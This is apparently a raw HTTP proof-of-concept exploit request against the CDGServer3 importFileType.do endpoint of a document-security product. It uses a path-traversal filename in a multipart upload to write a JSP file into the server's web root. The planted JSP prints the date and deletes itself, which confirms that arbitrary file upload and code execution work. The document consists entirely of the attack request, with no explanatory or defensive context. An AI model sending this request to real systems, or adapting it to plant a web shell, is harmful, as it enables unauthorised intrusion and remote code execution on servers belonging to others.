POST /CDGServer3/fileType/importFileType.do?flag=syn_user_policy HTTP/1.1
Host:
User-Agent: python-requests/2.24.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 212
Content-Type: multipart/form-data; boundary=a6c1544109e610dc4bddfc7583725f9c

--a6c1544109e610dc4bddfc7583725f9c
Content-Disposition: form-data; name="fileshare"; filename="/..\\..\\..\\..\\webapps\\ROOT\\testttttt.jsp"

<%@page import="java.text.*,java.util.*,java.io.*"%>
<%
SimpleDateFormat df = new SimpleDateFormat("yyy-MM-dd HH:mm:ss");
out.println(df.format(new Date()));
File file = new File(application.getRealPath(request.getServletPath()));
file.delete();
%>
--a6c1544109e610dc4bddfc7583725f9c--


